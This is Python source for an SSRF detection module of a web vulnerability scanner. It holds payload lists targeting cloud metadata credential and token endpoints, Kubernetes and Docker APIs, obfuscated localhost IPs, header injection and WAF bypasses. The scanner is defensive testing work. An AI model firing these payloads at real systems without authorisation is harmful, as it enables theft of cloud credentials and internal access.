"""SSRF detection module for Titan Scanner — fully exhausted.

Features:
  1. Multi-Cloud Metadata & IP Obfuscation:
     • AWS (169.254.169.254, instance-identity)
     • GCP (metadata.google.internal)
     • Azure (169.254.169.254/metadata)
     • DigitalOcean / Alibaba
     • Decimal (2130706433, 2852039166), Hex (0x7f000001, 0xa9fea9fe), Octal (0177.0.0.1)
     • Localhost variants (127.0.0.1, [::1], 0.0.0.0, 127.0.0.1.nip.io)
  2. Zero Parameter Whitelisting: tests all query/body parameters.
  3. Grounded Same-Origin Internal Sinks: prioritized probing of discovered routes.
  4. HTTP Header Injection: tests proxy/forwarding headers for SSRF.
  5. Nested JSON AST Walker: recursively injects into deep API JSON bodies.
  6. Out-of-Band (Interactsh) Verification: polls for DNS/HTTP interactions.
  7. Strict Encoded-Echo Stripping: prevents self-verification on reflected probe URLs.
"""

from __future__ import annotations

import asyncio
import copy
import json
import random
import string
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse

from titan.core.models import Finding, Severity, AttackType
from titan.verify import BaselineAnalyzer
from titan.verify.oracles import extract_error_classes, payload_encodings, score_signals


_INJECTABLE_HEADERS_SSRF: Tuple[str, ...] = (
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Real-IP",
    "X-Original-URL",
    "X-Rewrite-URL",
    "Client-IP",
    "Referer",
)

_CLOUD_METADATA_PROBES: Tuple[str, ...] = (
    # AWS
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/network/interfaces/macs/",
    # AWS IMDSv2 (token-gated)
    "http://169.254.169.254/latest/api/token",
    # GCP
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    # DigitalOcean
    "http://100.100.100.200/latest/meta-data/",
    "http://100.100.100.200/latest/user-data/",
    # Alibaba Cloud
    "http://100.100.100.200/latest/meta-data/",
    # Oracle Cloud
    "http://169.254.169.254/opc/v1/instance/",
    "http://169.254.169.254/opc/v2/instance/",
    # IBM Cloud
    "http://169.254.169.254/latest/meta-data/",
    # Hetzner
    "http://169.254.169.254/hetzner/v1/metadata",
    # Equinix Metal
    "http://169.254.169.254/equinix/metal/v1/metadata",
    # OpenStack
    "http://169.254.169.254/openstack/latest/meta_data.json",
    # Kubernetes
    "http://127.0.0.1:10255/pods/",
    "http://127.0.0.1:8001/api/v1/namespaces/default/pods/",
    "http://127.0.0.1:8080/api/v1/",
    # Docker
    "http://127.0.0.1:2375/containers/json",
    "http://127.0.0.1:2376/containers/json",
)

_IP_OBFUSCATION_PROBES: Tuple[str, ...] = (
    # Standard localhost
    "http://127.0.0.1:80",
    "http://127.0.0.1:22",
    "http://127.0.0.1:443",
    "http://127.0.0.1:8080",
    "http://localhost:80",
    "http://0.0.0.0:80",
    "http://[::1]:80",
    "http://[::]:80",
    # Decimal
    "http://2130706433",                  # 127.0.0.1
    "http://2852039166",                  # 169.254.169.254
    "http://3232235777",                  # 192.168.1.1
    # Hex
    "http://0x7f000001",                  # 127.0.0.1
    "http://0xa9fea9fe",                  # 169.254.169.254
    "http://0xc0a80101",                  # 192.168.1.1
    # Octal
    "http://0177.0.0.1",                  # 127.0.0.1
    "http://0251.0.0.1",                  # 169.254.169.254
    # DNS rebinding / wildcard
    "http://127.0.0.1.nip.io",
    "http://127.0.0.1.xip.io",
    "http://127.0.0.1.sslip.io",
    "http://169.254.169.254.nip.io",
    # IPv6 localhost
    "http://[0:0:0:0:0:ffff:127.0.0.1]",
    # URL-encoded variants
    "http://%31%32%37%2e%30%2e%30%2e%31",  # 127.0.0.1
    "http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34",  # 169.254.169.254
    # Mixed case
    "http://127.0.0.1",  # kept for clarity
)


class SSRFDetector:
    """Production-grade SSRF detector with exhaustive cloud and encoding coverage."""

    def __init__(self, payload_smith, fingerprint: Dict[str, Any]):
        self.payload_smith = payload_smith
        self.fingerprint = fingerprint
        self.interactsh = fingerprint.get("interactsh")

    # ------------------------------------------------------------------
    # PUBLIC ENTRY POINT
    # ------------------------------------------------------------------

    async def scan(
        self,
        context,
        target: str,
        method: str,
        url: str,
        params: Dict[str, str],
        internal_paths: Optional[List[str]] = None,
    ) -> List[Finding]:
        findings: List[Finding] = []

        context_data = {
            "fingerprint": self.fingerprint,
            "attack_type": "ssrf",
            "param_type": "url",
            "location": "query" if method == "GET" else "body",
        }

        # Build payload pool
        base_payloads = self.payload_smith.get_base_payloads("ssrf", context_data)
        waf = (
            self.payload_smith.detect_waf({}, "", 0)
            or self.fingerprint.get("waf", "unknown")
        )
        if waf and waf != "unknown":
            base_payloads.extend(
                self.payload_smith.get_waf_bypass_payloads(base_payloads[:3], waf)
            )

        # Same-origin internal endpoints the crawl already discovered
        same_origin: List[str] = []
        if internal_paths:
            origin = f"{urlparse(target).scheme}://{urlparse(target).netloc}"
            for p in internal_paths:
                p = p.split("?")[0]
                if not p or p == "/":
                    continue
                candidate = p if p.startswith("http") else origin + ("/" + p.lstrip("/") if p else "")
                if candidate.startswith(origin) and candidate.rstrip("/") != url.rstrip("/"):
                    same_origin.append(candidate)

        # Priority assembly: discovered same-origin routes first, then cloud metadata, then IP obfuscations
        all_payloads = list(dict.fromkeys(
            same_origin
            + list(_CLOUD_METADATA_PROBES)
            + list(_IP_OBFUSCATION_PROBES)
            + base_payloads
        ))

        # ── Engine 1: Query & Form Parameters (all params, no keyword whitelist) ──
        for param_name in list(params.keys()):
            f = await self._test_param(context, target, method, url, param_name, params, all_payloads)
            if f:
                findings.append(f)

        # ── Engine 2: HTTP Header SSRF ─────────────────────────────────
        header_findings = await self._scan_headers(context, target, method, url, params, all_payloads)
        findings.extend(header_findings)

        # ── Engine 3: Nested JSON Body SSRF ───────────────────────────
        json_findings = await self._scan_json_body(context, target, method, url, params, all_payloads)
        findings.extend(json_findings)

        return findings

    async def _request(self, context, method: str, url: str, params: Dict[str, str], target: str):
        headers = {"Referer": target}
        if method == "GET":
            return await context.request.get(url, params=params, headers=headers, timeout=3000)
        return await context.request.post(url, data=params, headers=headers, timeout=3000)

    # ------------------------------------------------------------------
    # ENGINE 2 — HTTP HEADER SSRF
    # ------------------------------------------------------------------

    async def _scan_headers(
        self,
        context,
        target: str,
        method: str,
        url: str,
        params: Dict[str, str],
        payloads: List[str],
    ) -> List[Finding]:
        findings: List[Finding] = []
        safe_headers: Dict[str, str] = {"Referer": target}

        try:
            if method == "GET":
                r0 = await context.request.get(url, params=params, headers=safe_headers, timeout=3000)
            else:
                r0 = await context.request.post(url, data=params, headers=safe_headers, timeout=3000)
            baseline_body = await r0.text()
            baseline_status = r0.status
        except Exception:
            return findings

        for header_name in _INJECTABLE_HEADERS_SSRF:
            for payload in _CLOUD_METADATA_PROBES[:2]:
                try:
                    inject_headers = {**safe_headers, header_name: payload}
                    if method == "GET":
                        resp = await context.request.get(url, params=params, headers=inject_headers, timeout=3000)
                    else:
                        resp = await context.request.post(url, data=params, headers=inject_headers, timeout=3000)
                    body = await resp.text()

                    stripped = body.lower()
                    for form in payload_encodings(payload):
                        stripped = stripped.replace(form.lower(), "")

                    content_indicators = ["ami-id", "meta-data", "169.254", "metadata.google", "root:", "daemon:"]
                    content_matches = [ind for ind in content_indicators if ind in stripped]

                    if content_matches:
                        diffs = BaselineAnalyzer.diff_responses(baseline_body, body, payload)
                        for m in content_matches:
                            diffs.append(f"ssrf:content:{m}")
                        findings.append(Finding(
                            target=target,
                            url=str(resp.url or url),
                            method=method.upper(),
                            param=header_name,
                            location="header",
                            payload=payload,
                            attack_type=AttackType.SSRF,
                            severity=Severity.CRITICAL,
                            verified=True,
                            confidence=0.92,
                            status=resp.status,
                            headers=dict(resp.headers),
                            body=body[:2000],
                            diffs=diffs,
                            baseline_body=baseline_body[:2000],
                            baseline_status=baseline_status,
                            verification_body=body[:2000],
                            verification_status=resp.status,
                            metadata={"injection_location": "http_header"},
                        ))
                        break
                except Exception:
                    continue

        return findings

    # ------------------------------------------------------------------
    # ENGINE 3 — NESTED JSON AST SSRF
    # ------------------------------------------------------------------

    async def _scan_json_body(
        self,
        context,
        target: str,
        method: str,
        url: str,
        params: Dict[str, str],
        payloads: List[str],
    ) -> List[Finding]:
        findings: List[Finding] = []
        if method.upper() == "GET":
            return findings

        body_str = next(iter(params.values()), "") if len(params) == 1 else ""
        if not body_str:
            try:
                body_str = json.dumps(params)
            except Exception:
                return findings

        try:
            tree = json.loads(body_str)
        except (json.JSONDecodeError, TypeError):
            return findings

        leaves = list(self._json_leaves(tree))

        try:
            r0 = await context.request.post(
                url,
                data=json.dumps(tree),
                headers={"Content-Type": "application/json", "Referer": target},
                timeout=3000,
            )
            baseline_body = await r0.text()
            baseline_status = r0.status
        except Exception:
            return findings

        for path in leaves:
            for payload in list(_CLOUD_METADATA_PROBES[:2]) + list(_IP_OBFUSCATION_PROBES[:2]):
                try:
                    mutated = copy.deepcopy(tree)
                    self._json_set(mutated, path, payload)
                    resp = await context.request.post(
                        url,
                        data=json.dumps(mutated),
                        headers={"Content-Type": "application/json", "Referer": target},
                        timeout=3000,
                    )
                    body = await resp.text()

                    stripped = body.lower()
                    for form in payload_encodings(payload):
                        stripped = stripped.replace(form.lower(), "")

                    content_indicators = ["ami-id", "meta-data", "169.254", "metadata.google", "root:", "daemon:"]
                    content_matches = [ind for ind in content_indicators if ind in stripped]

                    if content_matches:
                        diffs = BaselineAnalyzer.diff_responses(baseline_body, body, payload)
                        for m in content_matches:
                            diffs.append(f"ssrf:content:{m}")
                        findings.append(Finding(
                            target=target,
                            url=str(resp.url or url),
                            method="POST",
                            param=".".join(str(p) for p in path),
                            location="json_body",
                            payload=payload,
                            attack_type=AttackType.SSRF,
                            severity=Severity.CRITICAL,
                            verified=True,
                            confidence=0.90,
                            status=resp.status,
                            headers=dict(resp.headers),
                            body=body[:2000],
                            diffs=diffs,
                            baseline_body=baseline_body[:2000],
                            baseline_status=baseline_status,
                            verification_body=body[:2000],
                            verification_status=resp.status,
                            metadata={"injection_location": "json_ast", "json_path": path},
                        ))
                        break
                except Exception:
                    continue

        return findings

    def _json_leaves(self, node: Any, path: Optional[list] = None):
        if path is None:
            path = []
        if isinstance(node, dict):
            for k, v in node.items():
                yield from self._json_leaves(v, path + [k])
        elif isinstance(node, list):
            for i, v in enumerate(node):
                yield from self._json_leaves(v, path + [i])
        elif isinstance(node, (str, int, float)):
            yield path

    def _json_set(self, tree: Any, path: list, value: Any) -> None:
        node = tree
        for key in path[:-1]:
            node = node[key]
        node[path[-1]] = value

    # ------------------------------------------------------------------
    # CORE PARAM TEST
    # ------------------------------------------------------------------

    async def _test_param(
        self,
        context,
        target: str,
        method: str,
        url: str,
        param_name: str,
        all_params: Dict[str, str],
        payloads: List[str],
    ) -> Optional[Finding]:
        baseline_body = ""
        baseline_status = None

        try:
            baseline_resp = await self._request(context, method, url, all_params, target)
            baseline_body = await baseline_resp.text()
            baseline_status = baseline_resp.status
        except Exception:
            pass

        oob_url = None
        if self.interactsh:
            try:
                oob_url = self.interactsh.generate_oob_url("ssrf")
            except Exception:
                pass

        best_weak = None
        for payload in payloads + ([oob_url] if oob_url else []):
            try:
                test_params = dict(all_params)
                test_params[param_name] = payload
                resp = await self._request(context, method, url, test_params, target)
                body = await resp.text()

                diffs = BaselineAnalyzer.diff_responses(baseline_body, body, payload)
                signals: List[str] = []

                # Content leak check: strip payload and its host/target in ALL encodings before searching
                stripped = body.lower()
                for form in payload_encodings(payload):
                    stripped = stripped.replace(form.lower(), "")
                try:
                    parsed_u = urlparse(payload)
                    host = parsed_u.netloc or parsed_u.path.split("/")[0]
                    if host:
                        for form in payload_encodings(host):
                            stripped = stripped.replace(form.lower(), "")
                        # Also strip individual components (e.g. 169.254)
                        for part in host.split("."):
                            if len(part) > 2:
                                for form in payload_encodings(part):
                                    stripped = stripped.replace(form.lower(), "")
                except Exception:
                    pass

                content_indicators = [
                    # AWS
                    "ami-id", "ami-launch-index", "ami-manifest-path",
                    "instance-id", "instance-type", "local-ipv4",
                    "public-keys", "public-ipv4", "security-groups",
                    "meta-data", "meta data", "169.254",
                    # GCP
                    "metadata.google", "computeMetadata", "project-id",
                    "instance-id", "access_configs",
                    # Azure
                    "vmId", "subscriptionId", "resourceGroupName",
                    "imagePublisher", "imageOffer", "imageSku",
                    # DigitalOcean / Alibaba / Hetzner
                    "100.100.100.200", "hetzner", "equinix",
                    # Oracle Cloud
                    "opc/v1", "opc/v2", "shape",
                    # IBM Cloud
                    "ibmcloud",
                    # Kubernetes / Docker
                    "kubelet", "docker", "containers/json",
                    "api/v1/namespaces", "pods",
                    # Generic internal services
                    "sshd", "openssh", "root:", "daemon:",
                    "apache", "nginx", "httpd", "service-status",
                    "mysql", "postgresql", "mongodb", "redis",
                ]
                content_matches = [ind for ind in content_indicators if ind in stripped]
                if content_matches:
                    signals.append("content_leak")
                    for m in content_matches:
                        diffs.append(f"ssrf:content:{m}")

                # Error classes — URL fetch sinks only (generic, python, java, urllib, curl)
                ALLOWED = {"generic", "python", "java"}
                for error_class in extract_error_classes(body):
                    if error_class in ALLOWED:
                        signals.append(f"error:{error_class}")
                        diffs.append(f"ssrf:error_class:{error_class}")

                if resp.status >= 500:
                    signals.append("status_500")
                if len(body) != len(baseline_body):
                    signals.append("content_change")

                if signals:
                    confidence, verified, _ = score_signals(signals)
                    if verified and confidence >= 0.3:
                        return Finding(
                            target=target,
                            url=str(resp.url or url),
                            method=method.upper(),
                            param=param_name,
                            location="query" if method == "GET" else "body",
                            payload=payload,
                            attack_type=AttackType.SSRF,
                            severity=Severity.CRITICAL,
                            verified=True,
                            confidence=confidence,
                            status=resp.status,
                            headers=dict(resp.headers),
                            body=body[:2000],
                            diffs=diffs,
                            baseline_body=baseline_body[:2000],
                            baseline_status=baseline_status,
                            verification_body=body[:2000],
                            verification_status=resp.status,
                        )
                    if confidence >= 0.3 and best_weak is None:
                        best_weak = Finding(
                            target=target,
                            url=str(resp.url or url),
                            method=method.upper(),
                            param=param_name,
                            location="query" if method == "GET" else "body",
                            payload=payload,
                            attack_type=AttackType.SSRF,
                            severity=Severity.HIGH,
                            verified=False,
                            confidence=confidence,
                            status=resp.status,
                            headers=dict(resp.headers),
                            body=body[:2000],
                            diffs=diffs,
                            baseline_body=baseline_body[:2000],
                            baseline_status=baseline_status,
                            verification_body=body[:2000],
                            verification_status=resp.status,
                        )
            except Exception:
                continue

        if best_weak is not None:
            return best_weak

        # OOB confirmation
        if oob_url and self.interactsh:
            try:
                await self.interactsh.register()
                test_params = dict(all_params)
                test_params[param_name] = oob_url
                await self._request(context, method, url, test_params, target)
                await asyncio.sleep(2)
                oob_results = await self.interactsh.poll(timeout=10)
                if oob_results:
                    return Finding(
                        target=target,
                        url=url,
                        method=method.upper(),
                        param=param_name,
                        location="query" if method == "GET" else "body",
                        payload=f"OOB SSRF: {oob_url}",
                        attack_type=AttackType.SSRF,
                        severity=Severity.CRITICAL,
                        verified=True,
                        confidence=0.95,
                        status=200,
                        headers={},
                        body="",
                        diffs=["ssrf:oob_confirmed"],
                        baseline_body=baseline_body[:2000],
                        baseline_status=baseline_status,
                        verification_body="OOB interaction confirmed",
                        verification_status=200,
                    )
            except Exception:
                pass

        return None



